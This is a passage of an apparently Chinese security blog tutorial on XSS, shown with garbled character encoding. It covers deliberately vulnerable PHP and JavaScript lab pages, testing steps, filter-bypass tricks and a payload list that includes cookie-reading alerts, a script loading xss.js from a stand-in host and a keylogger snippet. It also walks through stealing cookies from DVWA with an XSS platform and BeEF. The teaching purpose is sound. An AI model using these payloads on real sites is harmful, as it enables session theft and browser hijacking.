class="string">&quot;test&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Error connecting&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into comment values (&#x27;<span class="subst">$_POST</span>[name]&#x27;,&#x27;<span class="subst">$_POST</span>[comment]&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;select * from comment ;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;ï¼š&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;comment&quot;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„è¯„è®ºç•Œé¢ï¼Œç”¨æˆ·æäº¤æ•°æ®åä¿å­˜è‡³æ•°æ®åº“ï¼Œå†ç”±æ•°æ®åº“ä¸­è°ƒå‡ºæ•°æ®å¹¶æ˜¾ç¤ºå†ä¸‹æ–¹ã€‚æ˜¾ç„¶å¯¹å†™å…¥æ•°æ®åº“çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå­˜åœ¨XSSã€‚å­˜å‚¨å‹XSSçš„æ•°æ®æµå‘æ˜¯ï¼šå‰ç«¯â€“&gt;åç«¯â€“&gt;æ•°æ®åº“â€“&gt;åç«¯â€“&gt;å‰ç«¯ã€‚<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317212829283.png" alt="image-20210317212829283"></p><p>åœ¨è¾“å…¥æ¡†ï¼ˆå¯æ³¨å…¥ä½ç½®ï¼‰ä¸­æ’å…¥<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>ï¼Œç„¶åæäº¤ã€‚æ­¤xssä»£ç ä¼šå†™å…¥æ•°æ®åº“ï¼Œåé¢å†è®¿é—®è¿™ä¸ªé¡µé¢éƒ½ä¼šæ‰§è¡Œæ’å…¥çš„XSSä»£ç ï¼Œå‡ºç°å¼¹çª—ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317213645942.png" alt="image-20210317213645942"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317213733557.png" alt="image-20210317213733557"></p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç å¯ä»¥å‘ç°ï¼Œä»æ•°æ®åº“è°ƒå‡ºæ¥çš„æ•°æ®è¢«æµè§ˆå™¨æ‰§è¡Œäº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317214235176.png" alt="image-20210317214235176"></p><h2 id="DOMå‹XSS"><a href="#DOMå‹XSS" class="headerlink" title="DOMå‹XSS"></a>DOMå‹XSS</h2><p>ä¹Ÿè¢«ç§°ä½œæœ¬åœ°è·¨ç«™ï¼Œæ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹Document Object Modelï¼ˆDOMï¼‰çš„ä¸€ç§æ¼æ´ã€‚DOMæ˜¯ä¸€ä¸ªä¸å¹³å°ã€ç¼–ç¨‹è¯­è¨€ä¸ç›¸å¹²çš„æ¥å£ï¼Œå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœä¼šæˆä¸ºå±•ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†ã€‚DOMä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›å¯¹è±¡å¯ä»¥è¢«ç”¨æˆ·æ‰€æ“çºµï¼Œå¦‚urlï¼Œlocationç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡DOMæ¥åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œæ˜¯ä»å®¢æˆ·ç«¯å–å¾—DOMä¸­çš„æ•°æ®åå¹¶åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå› æ­¤ä»…ä»æœåŠ¡å™¨ç«¯æ˜¯æ²¡æœ‰åŠæ³•é˜²å¾¡DOMå‹XSSæ¼æ´çš„ï¼Œå¦‚è‹¥DOMä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„éªŒè¯ï¼Œä¾¿ä¼šäº§ç”ŸåŸºäºDOMçš„XSSæ¼æ´ã€‚åŸºäºDOMçš„XSSæ˜¯åå°„çš„ç‰¹ä¾‹ï¼Œå…¶ä¸­JavaScriptéšè—åœ¨URLä¸­ï¼Œå¹¶åœ¨å…¶å‘ˆç°æ—¶ç”±é¡µé¢ä¸­çš„JavaScriptå–å‡ºï¼Œè€Œä¸æ˜¯åœ¨æä¾›æœåŠ¡æ—¶åµŒå…¥åˆ°é¡µé¢ä¸­ã€‚è¿™å¯ä»¥ä½¿å…¶æ¯”å…¶ä»–æ”»å‡»æ›´éšè”½ï¼Œå¹¶ä¸”ç›‘æ§é¡µé¢æ­£æ–‡çš„WAFæˆ–å…¶ä»–é˜²æŠ¤æ£€æµ‹ä¸å‡ºæ¶æ„å†…å®¹ã€‚</p><blockquote><p>å¯èƒ½è§¦å‘DOMå‹XSSçš„å±æ€§</p><p>document.refererã€window.nameã€locationã€innerHTMLã€documen.write</p></blockquote><p>æµ‹è¯•ä»£ç <code>dom.php</code>,å‚è€ƒäº<a href="https://github.com/zhuifengshaonianhanlu/pikachu">Pikachu</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;DOMå‹XSSæµ‹è¯•&lt;/h2&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> str = document.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">            document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">            console.log(document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;click me!&quot;</span> onclick=<span class="string">&quot;domxss()&quot;</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">&quot;dom&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å®ƒé€šè¿‡ getElementById è·å–åˆ°äº†æ ‡ç­¾ Id ä¸º textçš„å†…å®¹èµ‹å€¼ç»™strï¼Œç„¶ååˆæŠŠ str çš„å†…å®¹é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼å†™åˆ°äº† a æ ‡ç­¾çš„ href å±æ€§ä¸­ï¼Œaæ ‡ç­¾ä¼šå†™åˆ° Id ä¸º domçš„ div æ ‡ç­¾ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡é—­åˆçš„æ–¹å¼æ„é€ Payload<code>#&#39;onclick=&quot;alert(document.cookie)&quot;</code>ã€‚DOMå‹XSSæ¼æ´æ•°æ®æµå‘æ˜¯ï¼š å‰ç«¯â€“&gt;æµè§ˆå™¨ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210316010752417.png" alt="image-20210316010752417"></p><h1 id="XSSæ¼æ´æµ‹è¯•æµç¨‹"><a href="#XSSæ¼æ´æµ‹è¯•æµç¨‹" class="headerlink" title="XSSæ¼æ´æµ‹è¯•æµç¨‹"></a>XSSæ¼æ´æµ‹è¯•æµç¨‹</h1><p><strong>é»‘ç›’æµ‹è¯•</strong></p><ol><li>åœ¨ç›®æ ‡ç«™ç‚¹ä¸Šæ‰¾åˆ°è¾“å…¥ç‚¹ï¼Œæ¯”å¦‚æœç´¢æ ï¼Œé”™è¯¯é¡µé¢ï¼Œç•™è¨€æ¿ç­‰ã€‚</li><li>è¾“å…¥ä¸€ç»„â€ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚<code>&gt;</code>,<code>&quot;</code>,<code>&#39;</code>ç­‰ï¼‰+å”¯ä¸€è¯†åˆ«å­—ç¬¦â€ï¼Œç‚¹å‡»æäº¤åï¼ŒæŸ¥çœ‹è¿”å›æºç ï¼Œæ˜¯å¦åšå¯¹åº”çš„å¤„ç†ã€‚</li><li>é€šè¿‡æœç´¢å®šä½åˆ°å”¯ä¸€è¯†åˆ«å­—ç¬¦ï¼Œç»“åˆå”¯ä¸€è¯†åˆ«å­—ç¬¦å‰åè¯­æ³•ç¡®è®¤æ˜¯å¦å¯ä»¥æ„é€ æ‰§è¡Œjsçš„æ¡ä»¶(æ„é€ é—­åˆ)ã€‚</li><li>æäº¤æ„é€ çš„è„šæœ¬ä»£ç ä»¥åŠå„ç§ç»•è¿‡å§¿åŠ¿ï¼Œçœ‹æ˜¯å¦å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œå¦‚æœæˆåŠŸæ‰§è¡Œåˆ™è¯´æ˜è¯¥ç«™ç‚¹å­˜åœ¨XSSæ¼æ´ã€‚</li></ol><p><strong>Tipsï¼š</strong></p><ol><li>é€šå¸¸æœç´¢æ å®¹æ˜“å‡ºç°åå°„å‹XSSï¼Œç•™è¨€æ¿å®¹æ˜“å‡ºç°å­˜å‚¨å‹XSSï¼›</li><li>æœ‰äº›ç½‘ç«™é‰´äºåå°å¯èƒ½å­˜åœ¨è¿‡æ»¤æªæ–½ï¼Œç»„å»ºçš„scriptå¯èƒ½ä¼šè¢«è¿‡æ»¤æ‰ï¼Œå› è€Œæ— æ³•ç”Ÿæ•ˆæˆ–è€…ç¯å¢ƒé™åˆ¶è„šæœ¬æ‰§è¡Œï¼›</li><li>é€šè¿‡å˜åŒ–ä¸åŒçš„scriptï¼Œå°è¯•ç»•è¿‡åå°çš„è¿‡æ»¤æœºåˆ¶ã€‚</li></ol><p><strong>ç™½ç›’æµ‹è¯•(ä»£ç å®¡è®¡)</strong></p><p>å…³äºXSSçš„ä»£ç å®¡è®¡ä¸»è¦å°±æ˜¯ä»æ¥æ”¶å‚æ•°çš„åœ°æ–¹å’Œä¸€äº›å…³é”®è¯å…¥æ‰‹ã€‚</p><p>PHPä¸­å¸¸è§çš„æ¥æ”¶å‚æ•°çš„æ–¹å¼æœ‰<code>$_GET</code>ã€<code>$_POST</code>ã€<code>$_REQUEST</code>ç­‰ç­‰ï¼Œå¯ä»¥æœç´¢æ‰€æœ‰æ¥æ”¶å‚æ•°çš„åœ°æ–¹ã€‚ç„¶åå¯¹æ¥æ”¶åˆ°çš„æ•°æ®è¿›è¡Œè·Ÿè¸ªï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰è¾“å‡ºåˆ°é¡µé¢ä¸­ï¼Œç„¶åçœ‹è¾“å‡ºåˆ°é¡µé¢ä¸­çš„æ•°æ®æ˜¯å¦è¿›è¡Œäº†è¿‡æ»¤å’Œhtmlç¼–ç ç­‰å¤„ç†ã€‚</p><p>ä¹Ÿå¯ä»¥æœç´¢ç±»ä¼¼echoè¿™æ ·çš„è¾“å‡ºè¯­å¥ï¼Œè·Ÿè¸ªè¾“å‡ºçš„å˜é‡æ˜¯ä»å“ªé‡Œæ¥çš„ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ§åˆ¶ï¼Œå¦‚æœä»æ•°æ®åº“ä¸­å–çš„ï¼Œæ˜¯å¦èƒ½æ§åˆ¶å­˜åˆ°æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå­˜åˆ°æ•°æ®åº“ä¹‹å‰æœ‰æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ç­‰ç­‰ã€‚</p><p>å¤§å¤šæ•°ç¨‹åºä¼šå¯¹æ¥æ”¶å‚æ•°å°è£…åœ¨å…¬å…±æ–‡ä»¶çš„å‡½æ•°ä¸­ç»Ÿä¸€è°ƒç”¨ï¼Œæˆ‘ä»¬å°±éœ€è¦å®¡è®¡è¿™äº›å…¬å…±å‡½æ•°çœ‹æœ‰æ²¡æœ‰è¿‡æ»¤ï¼Œèƒ½å¦ç»•è¿‡ç­‰ç­‰ã€‚</p><p>åŒç†å®¡è®¡DOMå‹æ³¨å…¥å¯ä»¥æœç´¢ä¸€äº›jsæ“ä½œDOMå…ƒç´ çš„å…³é”®è¯è¿›è¡Œå®¡è®¡ã€‚</p><h1 id="XSS-payload"><a href="#XSS-payload" class="headerlink" title="XSS-payload"></a>XSS-payload</h1><p>æ›´å¤šå¯è§ï¼š[<a href="https://www.cnblogs.com/-mo-/p/11229183.html">WEBå®‰å…¨]XSSå‘½ä»¤æ€»ç»“ ä½œè€…ï¼šè‚–æ´‹è‚–æ©ã€</a> </p><ol><li><p>è‹¥ä½¿ç”¨ä¸€äº›å‡½æ•°å°†æ„æˆxssä»£ç çš„ä¸€äº›å…³é”®å­—ç¬¦ç»™è¿‡æ»¤äº†ï¼Œå¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;script&gt;&#x2F;&quot;,&quot;&quot;,$name);      &#x2F;&#x2F;è¿‡æ»¤&lt;script&gt;</span><br><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;\&#x2F;script&gt;&#x2F;&quot;,&quot;&quot;,$name);   &#x2F;&#x2F;è¿‡æ»¤&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡æŠ€å·§ï¼šå¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡  <code>&lt;scripT&gt;alert(&#39;hack&#39;)&lt;/scripT&gt;</code></p></li><li><p>è‹¥ä¸åŒºåˆ†å¤§å°å†™è¿‡æ»¤æ ‡ç­¾ï¼Œå¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;script&gt;&#x2F;i&quot;,&quot;&quot;,$name);    &#x2F;&#x2F;ä¸åŒºåˆ†å¤§å°å†™è¿‡æ»¤ &lt;script&gt;</span><br><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;\&#x2F;script&gt;&#x2F;i&quot;,&quot;&quot;,$name);  &#x2F;&#x2F;ä¸åŒºåˆ†å¤§å°å†™è¿‡æ»¤ &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡æŠ€å·§ï¼šå¯ä»¥ä½¿ç”¨åµŒå¥—çš„scriptæ ‡ç­¾ç»•è¿‡  <code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p></li><li><p>è‹¥ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¿‡æ»¤ä¹‹é—´çš„æ‰€æœ‰å†…å®¹ï¼Œå¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); &#x2F;&#x2F;è¿‡æ»¤äº†&lt;script  åŠå…¶ä¹‹é—´çš„æ‰€æœ‰å†…å®¹</span><br></pre></td></tr></table></figure><p>è™½ç„¶æ— æ³•ä½¿ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾æ³¨å…¥XSSä»£ç ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡imgã€bodyç­‰æ ‡ç­¾çš„äº‹ä»¶æˆ–è€… iframe ç­‰æ ‡ç­¾çš„ src æ³¨å…¥æ¶æ„çš„ js ä»£ç ã€‚å¦‚payloadï¼š <code>&lt;img src=1 Î¿nerrÎ¿r=alert(&#39;hack&#39;)&gt;</code></p></li></ol><p>ä¸€äº›å¸¸ç”¨payloadï¼š</p><ul><li><code>&lt;script&gt;æ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;&#x2F;script&gt;   #å¼¹å‡ºhack</span><br><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;  #æ­£å¸¸æˆªæ–­</span><br><span class="line">&lt;script&gt;alert(\&#39;hack\&#39;)&lt;&#x2F;script&gt;  #æ•°æ®æäº¤è‡³æ•°æ®åº“æ—¶æœ‰æ—¶å¼•å·éœ€è¦è½¬ä¹‰ </span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;        #å¼¹å‡º1ï¼Œå¯¹äºæ•°å­—å¯ä»¥ä¸ç”¨å¼•å·</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;      #å¼¹å‡ºcookie</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;xxx.com&#x2F;xss.js&gt;&lt;&#x2F;script&gt;  #å¼•ç”¨å¤–éƒ¨çš„xss</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img&gt;æ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src&#x3D;1  Î¿nerrÎ¿r&#x3D;alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  Î¿nerrÎ¿r&#x3D;alert(document.cookie)&gt; </span><br><span class="line">&lt;img  src&#x3D;&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;body&gt;æ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body Î¿nlÎ¿ad&#x3D;alert(1)&gt;</span><br><span class="line">&lt;body Î¿npageshÎ¿w&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><ul><li><code>videoæ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video Î¿nlÎ¿adstart&#x3D;alert(1) src&#x3D;&quot;&#x2F;media&#x2F;hack-the-planet.mp4&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>styleæ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style Î¿nlÎ¿ad&#x3D;alert(1)&gt;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><ul><li><code>ç›‘å¬é”®ç›˜onkeydownäº‹ä»¶</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.onkeydown&#x3D;funciont(e)&#123;</span><br><span class="line">if(!e)e&#x3D;window.event;</span><br><span class="line">try(hijack();)catch(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>æ•è·ç”¨æˆ·è¾“å…¥çš„ç‰¹å®šé”®</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown()&#123;</span><br><span class="line">var keycode &#x3D; event.keyCode;</span><br><span class="line">var realkey &#x3D; String.fromCharCode(event.keyCode);</span><br><span class="line">alert(&quot;æŒ‰é”®ç : &quot; + keycode + &quot; å­—ç¬¦: &quot; + realkey);</span><br><span class="line">&#125;</span><br><span class="line">document.onkeydown &#x3D; keyDown;</span><br><span class="line">&lt;&#x2F;scrip&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;&gt;è¢«è¿‡æ»¤æ—¶</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert&#96;1&#96; </span><br><span class="line">â€œ autofocus onfocus&#x3D;alert(1)</span><br><span class="line">javascript:alert(111) #è¾“å…¥åœ¨ a æ ‡ç­¾çš„ hrefå±æ€§ä¸­</span><br></pre></td></tr></table></figure><h1 id="XSSå¹³å°"><a href="#XSSå¹³å°" class="headerlink" title="XSSå¹³å°"></a>XSSå¹³å°</h1><p>å¦‚æœæˆ‘ä»¬çš„JSæ°´å¹³ä¸€èˆ¬çš„è¯ï¼ˆçœŸå®ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç½‘ä¸Šå…è´¹çš„XSSå¹³å°æ¥æ„é€ ä»£ç å®æ–½æ”»å‡»ã€‚</p><p><a href="https://xss.pt/">ç»å…¸çš„XSSå¹³å°</a>ï¼ˆä¹Ÿå¯ä»¥ä¸‹è½½å®‰è£…<a href="https://github.com/trysec/BlueLotus_XSSReceiver">æ¸…åè“è²èŠ±æˆ˜é˜Ÿå¼€å‘çš„XSSå¹³å°</a> ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317214802204.png" alt="image-20210317214802204"></p><p>åœ¨æˆ‘çš„é¡¹ç›®ä¸­åˆ›å»ºæ–°é¡¹ç›®ï¼Œé€‰æ‹©æœ€åŸºæœ¬çš„é»˜è®¤æ¨¡å—ï¼Œå‹¾é€‰keepsessionï¼Œå¯ä»¥å®Œæˆè·å–cookieç­‰æ“ä½œã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317215103530.png" alt="image-20210317215103530"></p><p>åœ¨å‡ºç°xssçš„åœ°æ–¹å¯ä»¥æ’å…¥ä»¥ä¸‹ç»™å‡ºçš„ä»£ç ï¼Œå®Œæˆæ”»å‡»ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317215400602.png" alt="image-20210317215400602"></p><p>åœ¨DVWAçš„XSSä¸­è¿›è¡Œæµ‹è¯•ï¼Œæ’å…¥å…¶ä¸­ä¸€æ¡æ”»å‡»ä»£ç ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317222324244.png" alt="image-20210317222324244"></p><p>å›åˆ°xsså¹³å°ï¼Œå·²ç»è¿”å›äº†cookieç­‰ä¿¡æ¯ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317222507374.png" alt="image-20210317222507374"></p><h1 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h1><p>BeeFæ˜¯webæ¡†æ¶æ”»å‡»å¹³å°ï¼Œkali é›†æˆBeefï¼Œè€Œä¸”Beefæœ‰å¾ˆå¤šå¥½ä½¿çš„payloadã€‚ä¾‹å¦‚ï¼Œé€šè¿‡XSSè¿™ä¸ªç®€å•çš„æ¼æ´ï¼ŒBeeFå¯ä»¥é€šè¿‡ä¸€æ®µç¼–åˆ¶å¥½çš„javascriptæ§åˆ¶ç›®æ ‡ä¸»æœºçš„æµè§ˆå™¨ï¼Œé€šè¿‡æµè§ˆå™¨æ‹¿åˆ°å„ç§ä¿¡æ¯å¹¶ä¸”æ‰«æå†…ç½‘ä¿¡æ¯ï¼ŒåŒæ—¶èƒ½å¤Ÿé…åˆmetasploitè¿›ä¸€æ­¥æ¸—é€ä¸»æœºï¼Œå¼ºå¤§çš„æœ‰äº›å“äººã€‚</p><p>é¦–å…ˆåœ¨kaliæ‰“å¼€BeEFï¼Œåœ¨å·¦ä¾§æ ä¸­ç‚¹å‡»beefå›¾æ ‡ä¼šå…ˆå¼¹å‡ºä¸€ä¸ªå‘½ä»¤è¡Œçª—å£ï¼Œç„¶åä¼šæ‰“å¼€å¯¹åº”ç½‘é¡µï¼Œå‘½ä»¤è¡Œçª—å£æ˜¾ç¤ºäº†ä¸€äº›é…ç½®ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318000642015.png" alt="image-20210318000642015"></p><p>åˆ©ç”¨å‘½ä»¤è¡Œç»™å‡ºçš„æ–¹æ³•ï¼Œå°†è„šæœ¬ä»£ç æ’å…¥åˆ°å­˜åœ¨XSSçš„åœ°æ–¹ã€‚è¿™é‡Œé€‰æ‹©æ’å…¥åˆ°DVWAä¸­å­˜å‚¨å‹XSSæ¼æ´çš„é¡µé¢ã€‚è¿™é‡Œçš„kaliå°±ç›¸å½“äºä¸€å°æœåŠ¡å™¨ã€‚åŸç†ä¸XSSå¹³å°ç±»ä¼¼ï¼Œå°±æ˜¯å°†å—å®³è€…çš„ä¿¡æ¯å‘é€åˆ°kaliçš„beefä¸­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318002439090.png" alt="image-20210318002439090"></p><p>æ­¤æ—¶BeEFçš„ç½‘é¡µä¸­å·²ç»æ˜¾ç¤ºè‡ªå·±ä¸­æ‹›ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318002610341.png" alt="image-20210318002610341"></p><h1 id="XSSçš„å±å®³"><a href="#XSSçš„å±å®³" class="headerlink" title="XSSçš„å±å®³"></a>XSSçš„å±å®³</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108153631445.png"></p><ul><li><strong>é’“é±¼æ¬ºéª—</strong>ï¼šæœ€å…¸å‹çš„å³æ˜¯åˆ©ç”¨ç›®æ ‡ç½‘ç«™çš„åå°„å‹è·¨ç«™è„šæœ¬æ¼æ´å°†ç›®æ ‡ç½‘ç«™é‡å®šå‘åˆ°é’“é±¼ç½‘ç«™ï¼Œæˆ–è€…é€šè¿‡æ³¨å…¥é’“é±¼JavaScriptè„šæœ¬ä»¥ç›‘æ§ç›®æ ‡ç½‘ç«™çš„è¡¨å•è¾“å…¥ï¼Œç”šè‡³æ”»å‡»è€…åŸºäºDHTMLæŠ€æœ¯å¯¹ç›®æ ‡ç½‘ç«™å‘èµ·æ›´é«˜çº§çš„é’“é±¼æ”»å‡»ã€‚</li><li><strong>ç½‘ç«™æŒ‚é©¬</strong>ï¼šè·¨ç«™æ”»å‡»æ—¶ï¼Œæ”»å‡»è€…åˆ©ç”¨Iframeæ 